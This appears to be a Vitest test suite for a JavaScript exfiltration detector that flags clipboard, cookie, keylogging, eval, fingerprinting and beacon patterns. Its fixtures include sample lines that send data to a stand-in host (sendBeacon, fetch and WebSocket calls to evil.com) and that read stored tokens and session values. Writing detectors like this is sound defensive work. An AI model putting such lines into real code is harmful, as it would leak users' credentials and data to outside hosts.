import { describe, it, expect } from 'vitest';
import { detectExfiltration } from '@/lib/exfil-detector';

describe('Exfiltration Detector', () => {
  it('should detect clipboard access', () => {
    const result = detectExfiltration([
      { path: 'content.js', content: 'navigator.clipboard.readText()' },
    ]);
    expect(result.findings.some(f => f.type === 'clipboard-access')).toBe(true);
    expect(result.score).toBeGreaterThan(0);
  });

  it('should detect cookie access', () => {
    const result = detectExfiltration([
      { path: 'bg.js', content: 'const cookies = document.cookie;' },
    ]);
    expect(result.findings.some(f => f.type === 'cookie-access')).toBe(true);
  });

  it('should detect keylogging patterns', () => {
    const result = detectExfiltration([
      { path: 'injected.js', content: "document.addEventListener('keydown', handler)" },
    ]);
    expect(result.findings.some(f => f.type === 'keylogging')).toBe(true);
    expect(result.findings[0].severity).toBe('critical');
  });

  it('should detect eval usage', () => {
    const result = detectExfiltration([
      { path: 'script.js', content: "eval('alert(1)')" },
    ]);
    expect(result.findings.some(f => f.type === 'eval-execution')).toBe(true);
  });

  it('should detect sendBeacon', () => {
    const result = detectExfiltration([
      { path: 'tracker.js', content: "navigator.sendBeacon('https://evil.com/collect')" },
    ]);
    expect(result.findings.some(f => f.type === 'beacon')).toBe(true);
  });

  it('should detect canvas fingerprinting', () => {
    const result = detectExfiltration([
      { path: 'fp.js', content: 'const data = canvas.toDataURL()' },
    ]);
    expect(result.findings.some(f => f.type === 'canvas-fingerprinting')).toBe(true);
  });

  it('should return no findings for clean code', () => {
    const result = detectExfiltration([
      { path: 'clean.js', content: 'const x = 1 + 2; console.log(x);' },
    ]);
    expect(result.findings).toEqual([]);
    expect(result.score).toBe(0);
  });

  it('should cap score at 100', () => {
    const maliciousCode = `
      navigator.clipboard.readText();
      document.cookie;
      eval('code');
      navigator.sendBeacon('url');
      navigator.geolocation.getCurrentPosition();
      addEventListener('keydown', fn);
      new WebSocket('wss://evil.com');
      canvas.toDataURL();
      navigator.userAgent;
      fetch('https://evil.com/exfil');
      localStorage.getItem('token');
      sessionStorage.getItem('session');
      indexedDB.open('db');
      document.forms;
      RTCPeerConnection();
      navigator.permissions.query();
    `;
    const result = detectExfiltration([{ path: 'malicious.js', content: maliciousCode }]);
    expect(result.score).toBeLessThanOrEqual(100);
  });

  it('should generate summary with finding count', () => {
    const result = detectExfiltration([
      { path: 'test.js', content: 'eval("code"); document.cookie;' },
    ]);
    expect(result.summary).toContain('2');
  });
});
